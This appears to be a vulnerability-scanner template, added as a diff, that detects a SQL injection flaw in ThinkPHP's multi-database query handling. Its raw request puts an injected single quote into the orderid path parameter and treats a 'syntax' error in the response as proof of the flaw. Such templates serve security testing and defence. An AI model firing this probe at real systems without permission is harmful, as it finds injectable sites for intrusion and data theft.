@@ -1,0 +1,21 @@
+id: thinkphp_multi_sql_leak_5
+
+info:
+  name: "ThinkPHP 多数据库查询 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    The ThinkPHP framework contains SQL injection flaws within its multi-database query processing logic. Attackers with appropriate access privileges can craft malicious SQL statements through vulnerable input vectors, potentially leading to arbitrary database command execution and unauthorized data access.
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/pay/chongzhi/orderid/1%27 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
